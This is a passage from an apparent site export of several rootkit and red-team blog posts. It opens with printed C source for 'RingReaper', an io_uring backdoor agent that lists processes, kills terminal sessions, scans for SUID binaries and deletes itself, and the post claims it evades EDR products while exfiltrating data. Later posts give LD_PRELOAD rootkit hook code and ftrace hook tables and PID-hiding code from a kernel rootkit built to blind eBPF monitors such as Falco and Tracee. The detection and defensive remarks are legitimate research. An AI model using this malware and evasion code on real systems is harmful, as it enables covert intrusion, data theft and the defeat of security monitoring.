opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if 